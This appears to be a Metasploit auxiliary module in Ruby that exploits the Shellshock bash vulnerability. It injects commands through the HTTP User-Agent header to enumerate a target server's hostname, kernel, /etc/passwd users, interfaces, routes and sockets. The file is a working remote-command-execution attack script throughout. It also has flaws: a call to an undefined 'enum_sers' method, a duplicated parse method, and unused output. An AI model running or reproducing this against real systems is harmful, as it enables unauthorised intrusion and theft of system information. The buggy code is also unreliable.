##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'

class Metasploit3 < Msf::Auxiliary

    include Msf::Exploit::Remote::HttpClient

    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Shellshock Enumerator',
            'Description'    => %q{
                Enumerate system information via Shellshock
            },
            'Author'         => [ 'metacortex' ],
            'License'        => MSF_LICENSE
        ))

        register_options(
            [
                OptString.new('TARGETURI', [true, 'The base path', '/'])
            ], self.class)
    end

   def exploit(uri, cmd)
       res = send_request_raw({
       'method' => 'GET',
       'uri' => normalize_uri(uri),
       'agent' => '() { :; }; echo -ne "\r\n\r\nShellshock-resp:\r\n";' + cmd + '; echo -ne "\r\n\r\n"'
       })
       output = parse(res)
       return output
    end
   
    def parse(a)
        res_str = a.to_s
        re = Regexp.new "shellshock-resp:\r\n.*\r\n"
        search = res_str.split("\r\n\r\n")
        searchgrep = search.grep(/-resp:/)
        searchsplit = searchgrep[0].split(":\r\n")
        results = searchsplit[1].to_s.strip
        return results
    end

    def enum_sysinfo(uri)
        print_status("Enumerating System Information")
        hostname = exploit(uri, "hostname")
        date = exploit(uri, "date")
        uptime = exploit(uri, "uptime")
        kernel = exploit(uri, "uname -a")
        lsb = exploit(uri, "lsb_release -a")

        print_good("    Hostname: " + hostname)
        print_good("    Date: " + date)
        print_good("    Uptime: " + uptime)
        print_good("    Kernel: " + kernel)
    end
    
    def enum_users(uri)
        print_status("Enumerating User Information")
        passwd = exploit(uri, "/bin/cat /etc/passwd")

        print_good("    Users:\n" + passwd + "\n")
    end
    
    def enum_network(uri)
        print_status("Enumerating Network Information")
        ifconfig = exploit(uri, "/sbin/ifconfig")
        netstat = exploit(uri, "/bin/netstat -an")
        ttl = exploit(uri, "cat /proc/sys/net/ipv4/ip_default_ttl")
        route = exploit(uri, "/sbin/route")

        print_good("    TTL: " + ttl)
        print_good("    Interfaces:\n " + ifconfig + "\n")
        print_good("    Routing Table:\n" + route + "\n")
        print_good("    Sockets: \n" + netstat + "\n")
     end

     def parse(a)
         res_str = a.to_s
         re = Regexp.new "shellshock-resp:\r\n.*\r\n"
         search = res_str.split("\r\n\r\n")
         searchgrep = search.grep(/-resp:/)
         searchsplit = searchgrep[0].split(":\r\n")
         results = searchsplit[1].to_s.strip
         return results
     end

     def run
         uri = target_uri.path

         enum_sysinfo(uri)
         enum_sers(uri)
         enum_network(uri)

     end
end
